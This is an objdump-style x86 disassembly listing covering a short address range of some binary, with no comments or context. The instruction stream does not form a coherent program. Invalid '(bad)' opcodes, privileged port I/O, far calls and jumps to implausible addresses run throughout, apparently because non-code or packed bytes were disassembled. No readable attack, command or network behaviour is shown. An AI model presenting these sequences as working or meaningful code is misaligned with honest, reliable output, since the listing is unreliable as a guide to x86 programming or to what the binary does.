  419be3:	mov    WORD PTR [eax+0x7e43cd26],fs
  419be9:	fxch   st(2)
  419beb:	ja     0x419bdc
  419bed:	mov    ds:0xde7ba652,eax
  419bf2:	jp     0x419be9
  419bf4:	out    0x26,al
  419bf6:	inc    ecx
  419bf7:	jmp    0x441c7c80
  419bfc:	aas    
  419bfd:	cmc    
  419bfe:	and    al,0xf1
  419c00:	and    BYTE PTR [edx-0x7ff85d8a],dl
  419c06:	jg     0x419ba1
  419c08:	mov    al,0xd2
  419c0a:	fisttp QWORD PTR [ebx]
  419c0c:	mov    ebp,0x757987a7
  419c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c12:	repz add al,0xca
  419c15:	jbe    0x419c3f
  419c17:	jb     0x419bfc
  419c19:	cmp    DWORD PTR [eax],edx
  419c1b:	ror    DWORD PTR [edi+0x63],1
  419c1e:	add    esp,DWORD PTR [eax-0x28]
  419c21:	outs   dx,DWORD PTR ds:[esi]
  419c22:	outs   dx,DWORD PTR ds:[esi]
  419c23:	xchg   ebp,eax
  419c24:	test   eax,0x2d7a8195
  419c29:	mov    cl,0x45
  419c2b:	sbb    BYTE PTR [ebp-0x29cc7be5],bl
  419c31:	ds inc esp
  419c33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c34:	jecxz  0x419c79
  419c36:	ror    dl,1
  419c38:	jmp    0x419c44
  419c3a:	push   es
  419c3b:	push   ss
  419c3c:	mov    esi,0xa75e765b
  419c41:	pusha  
  419c42:	ror    edi,0x67
  419c45:	sub    eax,0x51761874
  419c4a:	loopne 0x419c78
  419c4c:	pop    ss
  419c4d:	call   0x41f777a2
  419c52:	(bad)  
  419c53:	shl    DWORD PTR [ebx],cl
  419c55:	cld    
  419c56:	add    eax,0xf09c1f40
  419c5b:	dec    eax
  419c5c:	mul    BYTE PTR [edx]
  419c5e:	ss inc esp
  419c60:	ss ja  0x419bef
  419c63:	adc    eax,0xe89725f
  419c68:	mov    ah,0x14
  419c6a:	ror    DWORD PTR [esi],1
  419c6c:	xchg   ebp,eax
  419c6d:	outs   dx,BYTE PTR ds:[esi]
  419c6e:	xor    edi,DWORD PTR [ebx+edi*1+0x7b48dcb1]
  419c75:	call   DWORD PTR [ecx]
  419c77:	add    DWORD PTR [esi+0x1113890e],eax
  419c7d:	mov    fs,WORD PTR [ecx-0xdc01d3e]
  419c83:	lahf   
  419c84:	ret    
  419c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c86:	scas   eax,DWORD PTR es:[edi]
  419c87:	in     al,dx
  419c88:	arpl   WORD PTR [ebp+0x77],ax
  419c8b:	xchg   edx,eax
  419c8c:	jo     0x419cbc
  419c8e:	je     0x419c20
  419c90:	push   esp
  419c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c92:	jo     0x419cba
  419c94:	call   0x1e17d6e
  419c99:	xchg   edi,eax
  419c9a:	dec    esi
  419c9b:	mov    al,0x60
  419c9d:	fbld   TBYTE PTR [edi+0x5d2d4b9]
  419ca3:	mov    WORD PTR [eax+0x22],es
  419ca6:	retf   
  419ca7:	leave  
  419ca8:	int3   
  419ca9:	stc    
  419caa:	das    
  419cab:	adc    edx,0xffffffab
  419cae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419caf:	or     DWORD PTR [edx],ebp
  419cb1:	scas   eax,DWORD PTR es:[edi]
  419cb2:	cmp    esp,edi
  419cb4:	sub    bh,BYTE PTR [ebp-0x7e]
  419cb7:	add    al,0x75
  419cb9:	cmp    al,BYTE PTR [esi]
  419cbb:	ds xor eax,0x30960343
  419cc1:	inc    edx
  419cc2:	imul   edi,DWORD PTR [edx],0x4490947b
  419cc8:	out    0x7d,al
  419cca:	cli    
  419ccb:	or     al,BYTE PTR [ebp+0x4ee8bb11]
  419cd1:	jnp    0x419d1c
  419cd3:	push   esi
  419cd4:	and    ah,BYTE PTR [edi]
  419cd6:	inc    ebx
  419cd7:	(bad)  
  419cd8:	in     eax,dx
  419cd9:	mov    eax,DWORD PTR [ecx-0x3]
  419cdc:	enter  0xb015,0xc8
  419ce0:	rcl    BYTE PTR [eax-0x19],0x2e
  419ce4:	ss mov cl,0xca
  419ce7:	cmp    BYTE PTR [eax],al
  419ce9:	loop   0x419c92
  419ceb:	daa    
  419cec:	repz mov ebp,0xec959c09
  419cf2:	dec    edx
  419cf3:	ror    BYTE PTR [edi+0x795c4516],1
  419cf9:	cmp    al,0x12
  419cfb:	sbb    dh,dl
  419cfd:	lea    ebp,[ecx]
  419cff:	xchg   edx,eax
  419d00:	mov    esp,0x9fd8a647
  419d05:	and    al,0x61
  419d07:	test   DWORD PTR [esi],ecx
  419d09:	and    BYTE PTR [ebx+eax*1+0x4e1f087b],0x47
  419d11:	test   eax,0xb679b03a
  419d16:	push   edx
  419d17:	xchg   DWORD PTR [ebx],eax
  419d19:	pop    ss
  419d1a:	push   esp
  419d1b:	xor    DWORD PTR [eax],edi
  419d1d:	call   0xf3df5afc
  419d22:	adc    al,0xbb
  419d24:	fidivr DWORD PTR [ecx+0x3ff869b2]
  419d2a:	dec    esp
  419d2b:	jp     0x419d68
  419d2d:	xchg   ebp,eax
  419d2e:	or     eax,0xeb8605d6
  419d33:	and    eax,0xaa84e731
  419d38:	mov    al,0x13
  419d3a:	jmp    0x21d081b8
  419d3f:	jmp    0x2afe:0xfb3572a0
  419d46:	in     al,dx
  419d47:	and    DWORD PTR [eax],edi
  419d49:	add    dh,BYTE PTR [edi-0x34d74a61]
  419d4f:	add    ebx,DWORD PTR [esi-0x4e0a1336]
  419d55:	ficom  WORD PTR [esi-0x45819480]
  419d5b:	and    ch,BYTE PTR [edi]
  419d5d:	stos   DWORD PTR es:[edi],eax
  419d5e:	mov    ebx,DWORD PTR [ecx]
  419d60:	stos   DWORD PTR es:[edi],eax
  419d61:	out    0xa2,eax
  419d63:	xor    bl,al
  419d65:	xchg   ebp,eax
  419d66:	cli    
  419d67:	je     0x419db1
  419d69:	or     DWORD PTR [ebx-0x549812c2],ebp
  419d6f:	imul   edi,DWORD PTR [ebx+0x43da4ad3],0xffffffcf
  419d76:	and    al,BYTE PTR [esi-0x19]
  419d79:	pop    edx
  419d7a:	adc    eax,0x5a42f9d7
  419d7f:	lods   eax,DWORD PTR ds:[esi]
  419d80:	lea    edx,[eax-0x79]
  419d83:	out    0x9c,al
  419d85:	sbb    BYTE PTR [esi+0x56],0xfc
  419d89:	or     ah,BYTE PTR [edi]
  419d8b:	push   ebx
  419d8c:	cld    
  419d8d:	call   0x2a895d6e
  419d92:	pop    ebp
  419d93:	sbb    dh,BYTE PTR [ebx]
  419d95:	sub    esp,DWORD PTR [edx+edi*4-0x41]
  419d99:	pop    ds
  419d9a:	fld    QWORD PTR [ebx+eiz*8]
  419d9d:	test   BYTE PTR [esi+ebx*1],al
  419da0:	inc    ecx
  419da1:	pushf  
  419da2:	fwait
  419da3:	or     esi,eax
  419da5:	sbb    DWORD PTR [esi-0x5],esi
  419da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419da9:	outs   dx,BYTE PTR ds:[esi]
  419daa:	mov    edi,0x226b5fbf
  419daf:	ins    BYTE PTR es:[edi],dx
  419db0:	in     al,0x7
  419db2:	fcomp  DWORD PTR es:[ebx-0x3f290f3e]
  419db9:	push   ss
  419dba:	xchg   ebp,eax
  419dbb:	aam    0x42
  419dbd:	jne    0x419d57
  419dbf:	sub    BYTE PTR [ecx+0x35],dl
  419dc2:	aas    
  419dc3:	stos   DWORD PTR es:[edi],eax
  419dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dc5:	fcomp  DWORD PTR [esi-0xca909cd]
  419dcb:	retf   
  419dcc:	js     0x419d69
  419dce:	xchg   edi,eax
  419dcf:	idiv   DWORD PTR ds:0xa32ee82a
  419dd5:	jge    0x419d61
  419dd7:	xchg   esi,eax
  419dd8:	mov    bh,0x1b
  419dda:	xchg   ebx,eax
  419ddb:	fs aas 
  419ddd:	clc    
  419dde:	mov    eax,ds:0xd8290ea2
  419de3:	add    ebx,edx
  419de5:	cwde   
  419de6:	inc    eax
  419de7:	lea    ebx,[eax-0xe]
  419dea:	jmp    0xb29bd83f
  419def:	and    BYTE PTR [esi+0x23c8bac8],ah
  419df5:	fidivr DWORD PTR [eax+ebx*8-0x13]
  419df9:	xchg   ebp,eax
  419dfa:	or     edx,edi
  419dfc:	std    
  419dfd:	add    ah,BYTE PTR [edx+0x44]
  419e00:	(bad)  
  419e01:	mov    ecx,0x8fc38fa9
  419e06:	dec    ecx
  419e07:	xchg   esp,eax
  419e08:	push   ebp
  419e09:	sub    ebp,DWORD PTR [esi]
  419e0b:	pop    ebp
  419e0c:	mov    esp,0x61d4fbdd
  419e11:	lds    ecx,FWORD PTR [ecx+0x48]
  419e14:	sbb    ebx,DWORD PTR [ebx+0x8]
  419e17:	and    dh,bl
  419e19:	dec    ebx
  419e1a:	in     eax,dx
  419e1b:	ds dec ecx
  419e1d:	mov    ebp,0x3213d530
  419e22:	sub    dl,BYTE PTR [edx-0x5698c587]
  419e28:	and    eax,0x563e2a83
  419e2d:	jle    0x419e67
  419e2f:	pop    es
  419e30:	aas    
  419e31:	push   ss
  419e32:	add    ecx,DWORD PTR [esi+0x6dcc69f]
  419e38:	mov    al,0xf2
  419e3a:	pop    esp
  419e3b:	cmp    eax,0xa9e18990
  419e40:	xchg   edx,eax
  419e41:	mov    dh,0x63
  419e43:	or     BYTE PTR [edx-0x27],dh
  419e46:	hlt    
  419e47:	stos   DWORD PTR es:[edi],eax
  419e48:	loope  0x419ec3
  419e4a:	inc    edi
  419e4b:	xor    ch,ch
  419e4d:	push   cs
  419e4e:	mov    bh,0x8
  419e50:	and    edi,esp
  419e52:	adc    eax,0xb724fd32
  419e57:	xor    esp,DWORD PTR [edi]
  419e59:	mov    ebp,0x8af30e60
  419e5e:	inc    ecx
  419e5f:	jecxz  0x419de6
  419e61:	and    BYTE PTR ds:0xc800bc1a,al
  419e67:	fisub  DWORD PTR [esi-0x40e29249]
  419e6d:	imul   ecx,DWORD PTR [edx+eax*4-0x5cb0a144],0x12
  419e75:	pushf  
  419e76:	sub    BYTE PTR [esi+0x5],dl
  419e79:	mov    WORD PTR [eax+0x2a],?
  419e7c:	test   eax,0x7f3b95ab
  419e81:	jb     0x419e66
  419e83:	arpl   WORD PTR [esi],si
  419e85:	outs   dx,DWORD PTR ds:[esi]
  419e86:	fldcw  WORD PTR [eax]
  419e88:	pop    esi
  419e89:	cwde   
  419e8a:	rol    DWORD PTR [ebx],1
  419e8c:	fistp  QWORD PTR [esi+ebp*1]
  419e8f:	leave  
  419e90:	add    al,0x24
  419e92:	sub    ch,BYTE PTR [eax-0x72d3fffa]
  419e98:	mov    bl,0xa9
  419e9a:	(bad)  
  419e9b:	pcmpeqw mm5,QWORD PTR [ebx-0x1a]
  419e9f:	xlat   BYTE PTR ds:[ebx]
  419ea0:	pop    edx
  419ea1:	jbe    0x419f12
  419ea3:	call   0x4f5d7562
  419ea8:	in     al,0x9a
  419eaa:	ficomp WORD PTR [ecx+0x2af08a0b]
  419eb0:	or     al,ah
  419eb2:	mov    dl,0x2f
  419eb4:	mul    BYTE PTR [esi+0xf]
  419eb7:	jl     0x419ebb
  419eb9:	sbb    DWORD PTR [esi+0x3f8b4f5b],ebx
  419ebf:	jle    0x419f36
  419ec1:	retf   0x3077
  419ec4:	icebp  
  419ec5:	pop    ds
  419ec6:	xchg   esp,eax
  419ec7:	push   ss
  419ec8:	jmp    FWORD PTR [ecx-0x2c]
  419ecb:	adc    ebx,DWORD PTR [eax-0x71fdca12]
  419ed1:	pusha  
  419ed2:	pop    esi
  419ed3:	out    0x4,eax
  419ed5:	mov    DWORD PTR ds:0xde180012,edi
  419edb:	cli    
  419edc:	leave  
  419edd:	stos   DWORD PTR es:[edi],eax
  419ede:	hlt    
  419edf:	pop    edx
  419ee0:	scas   eax,DWORD PTR es:[edi]
  419ee1:	mov    ds:0x22501fd2,eax
  419ee6:	xlat   BYTE PTR ds:[ebx]
  419ee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ee8:	mov    ds:0xc55f90c,al
  419eed:	icebp  
  419eee:	lock js 0x419f39
  419ef1:	aaa    
  419ef2:	rol    DWORD PTR [ecx+0x48],0xfb
  419ef6:	pop    esi
  419ef7:	popa   
  419ef8:	call   0xca26:0xcb512565
  419eff:	xchg   DWORD PTR [edx+0x4e],esi
  419f02:	xchg   DWORD PTR [ebx-0x3d],edx
  419f05:	inc    DWORD PTR [edx+eax*2+0x1c]
  419f09:	sub    eax,0x8bd7dec7
  419f0e:	mov    eax,ds:0x2bf15da7
  419f13:	shr    BYTE PTR [ecx-0x67],1
  419f16:	and    dh,BYTE PTR [ebx+0x5eb1dffe]
  419f1c:	(bad)  
  419f1d:	call   0x5c85442d
  419f22:	stos   BYTE PTR es:[edi],al
  419f23:	or     al,0xc
  419f25:	ins    DWORD PTR es:[edi],dx
  419f26:	or     eax,DWORD PTR [esi+0x79309ed3]
  419f2c:	fcom   QWORD PTR [ecx+0xb8914f6]
  419f32:	popf   
  419f33:	outs   dx,BYTE PTR ds:[esi]
  419f34:	cs aaa 
  419f36:	lahf   
  419f37:	sahf   
  419f38:	stos   BYTE PTR es:[edi],al
  419f39:	lahf   
  419f3a:	pop    edx
  419f3b:	inc    esp
  419f3c:	enter  0xed5d,0x98
  419f40:	retf   0xc20c
  419f43:	test   BYTE PTR [esi+0x1990fa03],dl
  419f49:	fstp   QWORD PTR [edi-0x463c030a]
  419f4f:	das    
  419f50:	aam    0x86
  419f52:	lods   eax,DWORD PTR ds:[esi]
  419f53:	out    0x86,eax
  419f55:	xor    ah,dl
  419f57:	imul   ecx,DWORD PTR [eax+0x61eff310],0xe8a1c34f
  419f61:	add    eax,DWORD PTR [esi]
  419f63:	mov    ebp,0xc830ccd1
  419f68:	repz fsubrp st(2),st
  419f6b:	call   0x8468:0x2c99a9cc
  419f72:	cli    
  419f73:	out    0x86,al
  419f75:	adc    BYTE PTR [ecx+0x64],bh
  419f78:	ja     0x419f5c
  419f7a:	push   esi
  419f7b:	sub    al,BYTE PTR [ebx]
  419f7d:	js     0x419fdf
  419f7f:	push   0xffffffef
  419f81:	inc    esi
  419f82:	fisttp WORD PTR [edi]
  419f84:	cli    
  419f85:	mov    dh,0xf1
  419f87:	xchg   esp,eax
  419f88:	js     0x419f58
  419f8a:	(bad)  
  419f8b:	mov    cl,0xf9
  419f8d:	stc    
  419f8e:	outs   dx,DWORD PTR ds:[esi]
  419f8f:	pop    edx
  419f90:	out    0xe6,al
  419f92:	rol    DWORD PTR [edx],1
  419f94:	mov    ds:0x4d49d821,eax
  419f99:	fwait
  419f9a:	ret    0x561d
  419f9d:	ins    BYTE PTR es:[edi],dx
  419f9e:	(bad)  
  419f9f:	lahf   
  419fa0:	sbb    bh,BYTE PTR [ebp+0x7ab5ed4f]
  419fa6:	fsubp  st(6),st
  419fa8:	sub    ch,BYTE PTR [esi-0x62fe1ff]
  419fae:	push   eax
  419faf:	or     BYTE PTR [edx],dh
  419fb1:	xchg   BYTE PTR [eax+0x54a4ab84],ch
  419fb7:	xor    bl,ah
  419fb9:	les    edx,FWORD PTR [esi+0x16]
  419fbc:	pop    ebp
  419fbd:	cmp    ecx,edi
  419fbf:	cld    
  419fc0:	fwait
  419fc1:	dec    eax
  419fc2:	jmp    0xa645b5ac
  419fc7:	cdq    
  419fc8:	mov    dl,0xd5
  419fca:	ret    
  419fcb:	inc    edx
  419fcc:	fistp  DWORD PTR ds:0x97623bdc
  419fd2:	imul   edx,DWORD PTR [ecx],0x69
  419fd5:	mov    eax,0x232aadc4
  419fda:	sbb    ch,cl
  419fdc:	or     DWORD PTR [eax],ebp
  419fde:	sbb    esi,eax
  419fe0:	dec    edx
  419fe1:	cli    
  419fe2:	add    DWORD PTR [eax+0x55],esi
  419fe5:	jns    0x419fc3
  419fe7:	pop    ebp
  419fe8:	aas    
  419fe9:	lods   eax,DWORD PTR ds:[esi]
  419fea:	paddq  mm5,QWORD PTR [ecx+0x6fde7af0]
  419ff1:	ins    DWORD PTR es:[edi],dx
  419ff2:	fadd   QWORD PTR [ecx-0x79dc50a0]
  419ff8:	or     dh,BYTE PTR [ebx+0x1]
  419ffb:	scas   eax,DWORD PTR es:[edi]
  419ffc:	or     DWORD PTR [esi-0x2],esp
  419fff:	shl    esp,cl
  41a001:	mov    al,ds:0x634cc90e
  41a006:	adc    cl,ah
  41a008:	cld    
  41a009:	in     eax,0x5a
  41a00b:	mov    DWORD PTR [ebx],eax
  41a00d:	inc    edi
  41a00e:	push   0xad400cf2
  41a013:	jp     0x419fe1
  41a015:	jl     0x41a013
  41a017:	xchg   edx,eax
  41a018:	add    al,BYTE PTR [eax-0x33f8e841]
  41a01e:	loop   0x41a007
  41a020:	retf   
  41a021:	cld    
  41a022:	mov    ch,0x1
  41a024:	pop    es
  41a025:	mov    WORD PTR [edx],gs
  41a027:	mov    ds:0x76a292b,eax
  41a02c:	retf   0xc5db
  41a02f:	lock inc ecx
  41a031:	sbb    BYTE PTR [edx],al
  41a033:	push   esp
  41a034:	int    0x4b
  41a036:	cmp    dh,BYTE PTR [edx+0x54c3d230]
  41a03c:	and    edi,DWORD PTR [ecx-0x2]
  41a03f:	mov    ds:0x9b7ec0bb,eax
  41a044:	retf   0x3b1a
  41a047:	pop    ecx
  41a048:	mov    cl,0x10
  41a04a:	jmp    0xf883338
  41a04f:	pop    esp
  41a050:	jbe    0x419fe5
  41a052:	inc    ebx
  41a053:	imul   edi,DWORD PTR [ebp+eax*4-0x5],0x65c8e15d
  41a05b:	push   0xffffffd6
  41a05d:	sbb    DWORD PTR [edx],ecx
  41a05f:	mov    ebp,0x50135c93
  41a064:	jmp    0x41a0b5
  41a066:	(bad)  [ecx]
  41a068:	push   ds
  41a069:	push   es
  41a06a:	xchg   ebx,eax
  41a06b:	jmp    0x41a0ea
  41a06d:	mov    ch,0xf7
  41a06f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41a071:	cmp    al,0x6f
  41a073:	jne    0x41a067
  41a075:	mov    bl,0xf6
  41a077:	or     al,0x1d
  41a079:	clc    
  41a07a:	dec    edi
  41a07b:	sar    BYTE PTR [edx+ebp*8],0x5d
  41a07f:	fs xchg edx,eax
  41a081:	sub    eax,0x41b19f23
  41a086:	xor    eax,0x698afabd
  41a08b:	cmp    DWORD PTR [ecx+ebx*8],esi
  41a08e:	adc    DWORD PTR [esi+0x3b],ebp
  41a091:	ins    DWORD PTR es:[edi],dx
  41a092:	push   eax
  41a093:	pop    esp
  41a094:	std    
  41a095:	(bad)  
  41a096:	mov    esi,0x26e6ee9e
  41a09b:	test   BYTE PTR [esi+0x90dc1d8],dh
  41a0a1:	stc    
  41a0a2:	cmc    
  41a0a3:	das    
  41a0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0a5:	jbe    0x41a0de
  41a0a7:	cld    
  41a0a8:	call   0x6490c3dc
  41a0ad:	inc    ebx
  41a0ae:	xor    BYTE PTR [ebx],dh
  41a0b0:	push   ebp
  41a0b1:	mov    ebx,0x8bef1c33
  41a0b6:	dec    ebx
  41a0b7:	xchg   esp,eax
  41a0b8:	shr    BYTE PTR [ecx+eax*1+0x28],1
  41a0bc:	retf   0x5b83
  41a0bf:	xor    dh,bh
  41a0c1:	add    al,0x2d
  41a0c3:	stc    
  41a0c4:	and    eax,0xffc018df
  41a0c9:	out    0xe8,eax
  41a0cb:	dec    ebp
  41a0cc:	lods   al,BYTE PTR ds:[esi]
  41a0cd:	loope  0x41a146
  41a0cf:	test   eax,0xf25c2812
  41a0d4:	ja     0x41a066
  41a0d6:	in     eax,0xa4
  41a0d8:	test   BYTE PTR [eax+0x2e4963d3],ah
  41a0de:	cmp    ecx,0xffffffec
  41a0e1:	dec    ebx
  41a0e2:	sbb    ebp,ebx
  41a0e4:	(bad)  
  41a0e5:	mov    ds:0x15d4de56,eax
  41a0ea:	nop
  41a0eb:	retf   
  41a0ec:	inc    ebx
  41a0ed:	sub    DWORD PTR [eax+0x7cfee35d],0x48
  41a0f4:	ins    BYTE PTR es:[edi],dx
  41a0f5:	outs   dx,DWORD PTR ds:[esi]
  41a0f6:	jp     0x41a11f
  41a0f8:	fild   WORD PTR [edx+0x2ad54e73]
  41a0fe:	mov    ah,0xa7
  41a100:	inc    ebx
  41a101:	fstp   st(1)
  41a103:	mov    cl,0x17
  41a105:	and    eax,0x1a3aa726
  41a10a:	aas    
  41a10b:	push   ds
  41a10c:	into   
  41a10d:	dec    esp
  41a10e:	fstp   TBYTE PTR [eax]
  41a110:	jnp    0x41a0cb
  41a112:	inc    ebx
  41a113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a114:	pop    ebp
  41a115:	in     al,0xbd
  41a117:	adc    al,0x79
  41a119:	aad    0x32
  41a11b:	ss cs jp 0x41a166
  41a11f:	das    
  41a120:	outs   dx,DWORD PTR ds:[esi]
  41a121:	rcr    al,cl
  41a123:	and    BYTE PTR [edi+0x21],bl
  41a126:	inc    ecx
  41a127:	bound  ecx,QWORD PTR [ecx-0x6cb18ece]
  41a12d:	clc    
  41a12e:	call   0xddc1d2ce
  41a133:	jg     0x41a0d8
  41a135:	into   
  41a136:	sbb    ch,ch
  41a138:	aam    0x27
  41a13a:	or     al,0xd5
  41a13c:	push   0xfffffff4
  41a13e:	jmp    0x41a1a0
  41a140:	rcl    BYTE PTR [esi-0x6e7da3c8],1
  41a146:	dec    edi
  41a147:	dec    esi
  41a148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a149:	clc    
  41a14a:	add    BYTE PTR [ecx],ch
  41a14c:	cs (bad) 
  41a14e:	push   ss
  41a14f:	xchg   ebx,eax
  41a150:	jo     0x41a0ee
  41a152:	xor    eax,0xfd50791
  41a157:	mov    dh,0x69
  41a159:	pop    edi
  41a15a:	stos   BYTE PTR es:[edi],al
  41a15b:	or     al,0xaa
  41a15d:	pop    ds
  41a15e:	sbb    esi,DWORD PTR [esi-0x2d]
  41a161:	sti    
  41a162:	in     al,dx
  41a163:	pop    ebx
  41a164:	ss pop eax
  41a166:	dec    ebx
  41a167:	dec    eax
  41a168:	pop    ds
  41a169:	or     bh,BYTE PTR [esi+0x5130f3ee]
  41a16f:	sahf   
  41a170:	and    esp,edi
  41a172:	dec    edx
  41a173:	xor    eax,0x281e94bc
  41a178:	mov    ah,0xca
  41a17a:	out    0xf3,eax
  41a17c:	out    0xd1,al
  41a17e:	enter  0x39e8,0x1f
  41a182:	pop    ecx
  41a183:	adc    BYTE PTR [edi],bh
  41a185:	retf   0x4ccf
  41a188:	out    dx,al
  41a189:	mov    edx,0xdf541a20
  41a18e:	adc    ecx,ecx
  41a190:	sbb    bl,bl
  41a192:	jae    0x41a1e4
  41a194:	call   0x4d2c:0xcff6f718
  41a19b:	add    ebp,DWORD PTR [eax-0x7f]
  41a19e:	mov    cl,0xc2
  41a1a0:	imul   ecx,DWORD PTR [esi+0x38],0x99448c46
  41a1a7:	and    al,0xc1
  41a1a9:	or     dl,0x4e
  41a1ac:	cmp    al,0xc2
  41a1ae:	test   eax,0x40a165e9
  41a1b3:	daa    
  41a1b4:	loop   0x41a1e7
  41a1b6:	pop    esp
  41a1b7:	leave  
  41a1b8:	stos   DWORD PTR es:[edi],eax
  41a1b9:	mov    edx,0xc72bb2eb
  41a1be:	in     eax,dx
  41a1bf:	xor    DWORD PTR [ebp-0x5d],edi
  41a1c2:	pop    ebp
  41a1c3:	aam    0x26
  41a1c5:	ror    ecx,0x21
  41a1c8:	xchg   esi,eax
  41a1c9:	sbb    DWORD PTR [edi],0x451fe288
  41a1cf:	inc    ebx
  41a1d0:	ds (bad) 
  41a1d2:	outs   dx,DWORD PTR ds:[esi]
  41a1d3:	ret    0x5575
  41a1d6:	sbb    DWORD PTR ds:0xa5cf5c0d,0x82ed438f
  41a1e0:	push   DWORD PTR [ecx+0x7f018ff6]
  41a1e6:	push   ss
  41a1e7:	ss dec ebx
  41a1e9:	into   
  41a1ea:	imul   ebp,DWORD PTR [edx],0xc20e2871
  41a1f0:	inc    ebp
  41a1f1:	arpl   WORD PTR [ebp-0x4f],si
  41a1f4:	sbb    BYTE PTR [esi-0x1],cl
  41a1f7:	cmp    DWORD PTR [esi],esi
  41a1f9:	mov    bh,0xd9
  41a1fb:	push   es
  41a1fc:	bound  ecx,QWORD PTR [edi+0x36c11a04]
  41a202:	mov    ah,0xe5
  41a204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a205:	dec    ah
  41a207:	das    
  41a208:	cmp    dl,BYTE PTR [edx+0x7a]
  41a20b:	mov    ebx,DWORD PTR [ecx]
  41a20d:	and    BYTE PTR [ebp+0xbd55a2f],bh
  41a213:	jnp    0x41a260
  41a215:	fist   WORD PTR [edi-0x20]
  41a218:	mov    ds:0x3ed834be,eax
  41a21d:	lds    esi,FWORD PTR [edi+0x77a2c8e1]
  41a223:	push   ds
  41a224:	lods   eax,DWORD PTR ds:[esi]
  41a225:	inc    ebx
  41a226:	inc    edx
  41a227:	pop    ebx
  41a228:	push   ebx
  41a229:	jmp    0x41a285
  41a22b:	xchg   esi,eax
  41a22c:	cmp    ch,BYTE PTR [edx+0x3]
  41a22f:	lods   al,BYTE PTR ds:[esi]
  41a230:	outs   dx,DWORD PTR ds:[esi]
  41a231:	les    edi,FWORD PTR [ecx-0x1160e65a]
  41a237:	js     0x41a213
  41a239:	ss inc ebp
  41a23b:	fs dec edi
  41a23d:	(bad)
  41a241:	outs   dx,BYTE PTR ds:[esi]
  41a242:	scas   al,BYTE PTR es:[edi]
  41a243:	les    eax,FWORD PTR ds:0x793a05f8
  41a249:	mov    ds:0x6eaa2a19,eax
  41a24e:	sub    al,0x0
  41a250:	lods   al,BYTE PTR ds:[esi]
  41a251:	outs   dx,BYTE PTR ds:[esi]
  41a252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a253:	sbb    bh,BYTE PTR [esi-0x26c2d029]
  41a259:	jl     0x41a28a
  41a25b:	jne    0x41a211
  41a25d:	loop   0x41a211
  41a25f:	fild   DWORD PTR [ebx]
  41a261:	xor    BYTE PTR [edx+0x74c4bd90],bl
  41a267:	aam    0xd6
  41a269:	xor    DWORD PTR [ebx+0x49],edx
  41a26c:	sub    al,0xa6
  41a26e:	jecxz  0x41a215
  41a270:	add    eax,0x8f6e3d99
  41a275:	iret   
  41a276:	mov    esi,0xd8eda44c
  41a27b:	enter  0x26af,0xfe
  41a27f:	mov    ds:0xece32a9f,al
  41a284:	cdq    
  41a285:	frstor [esi+esi*1]
  41a288:	mov    ecx,ebp
  41a28a:	loope  0x41a219
  41a28c:	sar    DWORD PTR [esi+0xabc5c4e],cl
  41a292:	jns    0x41a2a3
  41a294:	out    0xea,eax
  41a296:	lds    eax,FWORD PTR [ebx]
  41a298:	sub    DWORD PTR [ebx+0xc],esi
  41a29b:	ins    BYTE PTR es:[edi],dx
  41a29c:	add    DWORD PTR [esp+eiz*2],esi
  41a29f:	ja     0x41a2b5
  41a2a1:	frstor [esi]
  41a2a3:	popf   
  41a2a4:	and    DWORD PTR [esp-0x43ab489e],ecx
  41a2ab:	xchg   esp,eax
  41a2ac:	lock and DWORD PTR [edx+0x9accab9],edi
  41a2b3:	push   ss
  41a2b4:	add    al,0xd2
  41a2b6:	nop
  41a2b7:	imul   ebx,edi,0xffffff98
  41a2ba:	adc    DWORD PTR [ebx-0x8],edx
  41a2bd:	loop   0x41a320
  41a2bf:	lods   eax,DWORD PTR ds:[esi]
  41a2c0:	je     0x41a276
  41a2c2:	and    al,0x8a
  41a2c4:	cli    
  41a2c5:	in     al,0x82
  41a2c7:	addr16 test eax,0xaf7c8e85
  41a2cd:	js     0x41a29c
  41a2cf:	adc    ch,BYTE PTR [ecx-0x1cd034e1]
  41a2d5:	lods   eax,DWORD PTR ds:[esi]
  41a2d6:	cmp    cl,bl
  41a2d8:	mov    dh,0xc7
  41a2da:	push   ebp
  41a2db:	cmp    ch,BYTE PTR [eax]
  41a2dd:	mov    ebp,0xfb789c8e
  41a2e2:	clc    
  41a2e3:	cmp    edi,DWORD PTR [esi-0x59706383]
  41a2e9:	ret    
  41a2ea:	hlt    
  41a2eb:	jmp    0x96b3c2f6
  41a2f0:	sti    
  41a2f1:	dec    ebx
  41a2f2:	sub    cl,BYTE PTR [edi]
  41a2f4:	xor    cl,BYTE PTR [edi]
  41a2f6:	or     al,0x2b
  41a2f8:	stos   DWORD PTR es:[edi],eax
  41a2f9:	pop    esp
  41a2fa:	add    ebp,esp
  41a2fc:	jns    0x41a34c
  41a2fe:	(bad)  
  41a2ff:	vmwrite esp,DWORD PTR [edx+0x3f6c77c9]
  41a306:	loopne 0x41a34b
  41a308:	pusha  
  41a309:	repz mov ebp,0x2d91bc2
  41a30f:	enter  0x9835,0x48
  41a313:	mov    dh,0x96
  41a315:	dec    esp
  41a316:	mov    ds:0xa644ea5a,eax
  41a31b:	and    bl,BYTE PTR [esp+ecx*2+0xc6dc859]
  41a322:	into   
  41a323:	scas   eax,DWORD PTR es:[edi]
  41a324:	fwait
  41a325:	add    BYTE PTR [ecx],bl
  41a327:	mov    cl,0x31
  41a329:	in     eax,dx
  41a32a:	ss out dx,eax
  41a32c:	sbb    al,0x17
  41a32e:	jp     0x41a33b
  41a330:	clc    
  41a331:	jnp    0x41a31e
  41a333:	dec    ecx
  41a334:	pop    edi
  41a335:	xor    BYTE PTR [ecx],bl
  41a337:	fisub  WORD PTR [bx+di+0x17]
  41a33c:	repnz and eax,0xd3cdf8ab
  41a342:	cmc    
